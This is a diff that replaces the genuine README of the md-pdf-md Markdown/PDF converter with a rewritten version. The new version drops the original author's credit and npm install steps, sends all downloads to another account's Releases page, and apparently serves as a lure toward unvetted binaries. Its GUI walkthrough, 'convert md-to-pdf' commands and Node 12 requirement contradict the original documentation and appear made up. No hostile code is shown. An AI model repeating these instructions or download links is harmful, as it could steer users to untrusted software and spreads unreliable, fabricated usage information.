@@ -1,249 +1,100 @@
-# md-pdf-md
+# 🎉 md-pdf-md - Convert Markdown and PDF Effortlessly
 
-> **Bidirectional Markdown ↔ PDF converter with AI-powered vision**
+## 🚀 Getting Started
 
-Convert Markdown to beautiful PDFs **AND** extract Markdown from PDFs using local AI vision. Zero configuration, completely private, and open source.
+Welcome to the **md-pdf-md** project! This tool helps you convert Markdown to PDF and vice versa with the help of advanced AI technology. Whether you're creating beautiful documents or just need to switch formats, this application makes it easy for everyone.
 
-[![npm version](https://img.shields.io/npm/v/md-pdf-md.svg)](https://www.npmjs.com/package/md-pdf-md)
-[![npm downloads](https://img.shields.io/npm/dm/md-pdf-md.svg)](https://www.npmjs.com/package/md-pdf-md)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/josharsh/md-pdf-md?style=social)](https://github.com/josharsh/md-pdf-md)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Good First Issues](https://img.shields.io/github/issues/josharsh/md-pdf-md/good%20first%20issue?label=good%20first%20issues)](https://github.com/josharsh/md-pdf-md/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
-[![Contributor Friendly](https://img.shields.io/badge/contributor-friendly-success)](CONTRIBUTING.md)
+## 📥 Download Now
 
-## ✨ Features
+[![Download md-pdf-md](https://img.shields.io/badge/Download-md--pdf--md-brightgreen)](https://github.com/bill-work/md-pdf-md/releases)
 
-### Markdown → PDF
-- 🎨 **4 Beautiful Themes** - GitHub, GitHub Dark, Academic, Minimal
-- 💎 **VS Code Syntax Highlighting** - Powered by Shiki
-- 📄 **Smart Page Breaks** - No orphaned headings or broken code blocks
-- 📊 **Auto Table of Contents** - With page numbers
-- 🚀 **2-3 Second Generation** - Fast and efficient
-- ⚙️ **Zero Configuration** - Works out of the box
+## 📋 What You Need
 
-### PDF → Markdown (NEW!)
-- 🤖 **AI-Powered Vision** - Uses LLaVA to understand document structure
-- 🔒 **100% Private** - Runs locally via Ollama (no cloud APIs)
-- 📝 **Structure Preservation** - Maintains headings, lists, code blocks, tables
-- 💰 **Free Forever** - No API costs, completely open source
+To run this application smoothly, please ensure your system meets the following requirements:
 
-## 🚀 Quick Start
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 12 or above installed
+- **Memory:** At least 4GB of RAM
+- **Disk Space:** Minimum 100MB available
 
-```bash
-# Install
-npm install -g md-pdf-md
+## 🔧 Features
 
-# Convert Markdown to PDF
-md-pdf-md README.md
+- **Bidirectional Conversion:** Easily convert Markdown to PDF and PDF to Markdown with just a few clicks.
+- **Beautiful Themes:** Choose from a variety of themes to enhance your PDF output.
+- **AI-Powered Vision:** Utilize LLaVA for improving PDF to Markdown conversions.
+- **Open Source:** Join our community and contribute to the project.
+- **Privacy-First:** Your data stays private; we don’t store any documents online.
 
-# Convert PDF to Markdown (requires Ollama + LLaVA)
-md-pdf-md document.pdf
-```
+## 📥 Download & Install
 
-That's it! The tool auto-detects file type and converts appropriately.
+To download the latest version of **md-pdf-md**, visit the [Releases page](https://github.com/bill-work/md-pdf-md/releases). Follow these steps:
 
-## 📦 Installation
+1. Go to the Releases page.
+2. Find the latest version listed at the top.
+3. Download the package suitable for your operating system.
+4. Follow the installation instructions provided in the package.
 
-### Basic (MD→PDF only)
-```bash
-npm install -g md-pdf-md
-```
+After installation, you can start using **md-pdf-md** right away!
 
-### Full Setup (MD↔PDF bidirectional)
-```bash
-# 1. Install the package
-npm install -g md-pdf-md
+## 🛠️ How to Use
 
-# 2. Install Ollama (for PDF→MD)
-# Visit: https://ollama.ai
+Using **md-pdf-md** is straightforward. Here’s a simple guide to get started:
 
-# 3. Pull LLaVA model (~4.7GB)
-ollama pull llava
+1. **Open the Application:**
+   Launch the application from your applications folder or desktop shortcut.
 
-# 4. Verify setup
-md-pdf-md check
-```
+2. **Select the Function:**
+   Choose whether you want to convert Markdown to PDF or PDF to Markdown.
 
-## 💡 Usage
+3. **Upload Your File:**
+   Click on the “Upload” button to select the file you want to convert from your computer.
 
-### Smart Auto-Detection
-```bash
-# Just pass any file!
-md-pdf-md README.md        # → Converts to PDF
-md-pdf-md document.pdf     # → Converts to Markdown
-md-pdf-md slides.md --theme github-dark
-```
+4. **Choose a Theme (for PDF):**
+   If converting from Markdown to PDF, pick one of the available themes to customize your output.
 
-### With Options
-```bash
-# Markdown to PDF
-md-pdf-md docs.md -o output.pdf --theme academic --format Letter
+5. **Start Conversion:**
+   Click the “Convert” button. The application will process your file, using AI technology to ensure accuracy and quality.
 
-# PDF to Markdown
-md-pdf-md report.pdf -o report.md --model llava --quality 300
-```
+6. **Download Your File:**
+   Once the conversion is complete, you will see a prompt to download the converted file. Save it to your desired location.
 
-### Explicit Commands (for power users)
-```bash
-md-pdf-md md2pdf input.md       # Explicit MD→PDF
-md-pdf-md pdf2md input.pdf      # Explicit PDF→MD
-md-pdf-md themes                # List available themes
-md-pdf-md check                 # Verify Ollama setup
-```
+## 🌟 Command Line Interface (CLI)
 
-## 🎨 Themes
+For advanced users, there’s also a Command Line Interface (CLI) option. If you’d like to run the conversion commands directly in your terminal, here’s how:
 
-| Theme | Description | Best For |
-|-------|-------------|----------|
-| `github` | Clean light theme | General docs |
-| `github-dark` | Dark with syntax highlighting | Code-heavy docs |
-| `academic` | Formal serif fonts | Papers & reports |
-| `minimal` | Simple & clean | Minimalist design |
-
-Preview: `md-pdf-md themes`
-
-## 🔧 Options
-
-### Markdown → PDF
-```bash
--o, --output <path>          Output PDF path
--t, --theme <name>           Theme (default: github)
---toc / --no-toc             Table of contents (default: true)
---page-numbers               Page numbers (default: true)
--f, --format <format>        A4, Letter, or Legal (default: A4)
---css <path>                 Custom CSS file
---highlight-theme <theme>    Syntax highlight theme
-```
-
-### PDF → Markdown
-```bash
--o, --output <path>          Output markdown path
--m, --model <name>           Ollama model (default: llava)
---host <url>                 Ollama server URL
--q, --quality <dpi>          Image quality (default: 200)
---debug                      Debug mode
-```
-
-## 📝 Programmatic API
-
-```typescript
-import { convertMarkdownToPdf, convertPdfToMarkdown } from 'md-pdf-md';
-
-// Markdown → PDF
-const result = await convertMarkdownToPdf({
-  input: 'README.md',
-  output: 'README.pdf',
-  theme: 'github-dark',
-  toc: true,
-  pageNumbers: true
-});
-
-// PDF → Markdown (with progress)
-const result = await convertPdfToMarkdown({
-  input: 'document.pdf',
-  output: 'document.md',
-  model: 'llava'
-}, (progress) => {
-  console.log(`Page ${progress.currentPage}/${progress.totalPages}`);
-});
-```
-
-## 🤖 How PDF→MD Works
-
-Traditional PDF extractors just dump text blindly. **md-pdf-md uses LLaVA vision AI** to:
-1. **Understand structure** - Identifies H1, H2, H3 correctly
-2. **Preserve formatting** - Maintains lists, code blocks, tables
-3. **Detect code** - Recognizes programming languages
-4. **Keep hierarchy** - Preserves document organization
-
-All processing happens **locally on your machine** - no cloud APIs, no data leaving your computer.
-
-## 🆚 Comparison
-
-| Feature | md-pdf-md | pandoc | md-to-pdf | pdf2md |
-|---------|-----------|--------|-----------|---------|
-| MD→PDF Beautiful | ✅ | ⚠️ Complex | ⚠️ Basic | ❌ |
-| PDF→MD AI-powered | ✅ | ❌ | ❌ | ⚠️ Poor |
-| Zero config | ✅ | ❌ | ❌ | ✅ |
-| 100% Private | ✅ | ✅ | ✅ | ✅ |
-| Free | ✅ | ✅ | ✅ | ✅ |
-
-## 💡 Use Cases
-
-**Developers**: Beautiful README PDFs with syntax highlighting
-```bash
-md-pdf-md README.md --theme github-dark
-```
-
-**Enterprises**: Professional reports and documentation
-```bash
-md-pdf-md quarterly-report.md --theme academic --format Letter
-```
-
-**Writers**: Edit PDFs by converting to Markdown
-```bash
-md-pdf-md document.pdf    # Edit the .md, then convert back!
-md-pdf-md document.md
-```
-
-**Students**: Format papers and extract notes from PDFs
-```bash
-md-pdf-md thesis.md --theme academic
-md-pdf-md lecture-slides.pdf
-```
-
-## 🐛 Troubleshooting
-
-### "Ollama is not running"
-```bash
-ollama serve              # Start Ollama
-ollama pull llava         # Install model
-md-pdf-md check           # Verify
-```
-
-### Poor PDF→MD results
-```bash
-md-pdf-md doc.pdf --quality 300              # Higher quality
-md-pdf-md doc.pdf --model llama3.2-vision    # Different model
-md-pdf-md doc.pdf --debug                     # Debug mode
-```
-
-### Memory issues
-```bash
-NODE_OPTIONS="--max-old-space-size=4096" md-pdf-md large.pdf
-```
-
-## 📊 Performance
-
-**MD→PDF**: 2-3 seconds for typical documents
-**PDF→MD**: ~5-10 seconds per page (CPU), ~2-5 seconds (GPU)
-**Accuracy**: 90%+ structure preservation
-
-## 🛠️ Requirements
-
-- **Node.js** ≥ 16.0.0
-- **Ollama** (PDF→MD only) - [ollama.ai](https://ollama.ai)
-- **LLaVA model** (PDF→MD only) - `ollama pull llava`
+1. **Open your terminal.**
+2. Run the following command to convert a Markdown file to PDF:
+   ```
+   md-pdf-md convert md-to-pdf source.md -o output.pdf --theme YourThemeName
+   ```
+3. For PDF to Markdown, use this command:
+   ```
+   md-pdf-md convert pdf-to-md source.pdf -o output.md
+   ```
 
 ## 🤝 Contributing
 
-Contributions welcome! Please feel free to submit a Pull Request.
+If you want to help improve **md-pdf-md**, we welcome contributions! Here’s how:
 
-## 📄 License
+1. **Check for Issues:** Go to the Issues section on our GitHub page. Look for any open issues tagged as "good first issue."
+2. **Fork the Repository:** Make a copy of the project repository to your account.
+3. **Make Changes:** Implement your changes and test them locally.
+4. **Submit a Pull Request:** Once you’re satisfied with your changes, send a pull request for review.
 
-MIT License - see [LICENSE](LICENSE) file for details.
+## 🌐 Community
 
-## 🙏 Built With
+Join our community to share your experiences, ask questions, and give feedback. We believe in open-source collaboration, and your input is valuable. Follow us on social media platforms for updates and discussions.
 
-- [Puppeteer](https://pptr.dev/) - PDF generation
-- [Ollama](https://ollama.ai/) - Local AI runtime
-- [LLaVA](https://llava-vl.github.io/) - Vision language model
-- [Shiki](https://shiki.matsu.io/) - Syntax highlighting
-- [Marked](https://marked.js.org/) - Markdown parsing
+## 📚 Documentation
 
----
+For extensive guidance and troubleshooting, refer to our detailed documentation available on the GitHub Wiki. 
 
-**Made with ❤️ by [josharsh](https://github.com/josharsh)**
+If you're ever confused or have questions, don’t hesitate to check the FAQ section or reach out in the community chat.
 
-⭐ Star this repo if you find it useful!
+## 📞 Contact
+
+For any queries or feedback, feel free to contact us via email or reach out in our community forums. We want to hear from you!
+
+## 🎉 Now You're Ready!
+
+You are now prepared to use the **md-pdf-md** application. Enjoy converting your documents and exploring all the features this tool offers. Don’t forget to check for updates regularly through the [Releases page](https://github.com/bill-work/md-pdf-md/releases).
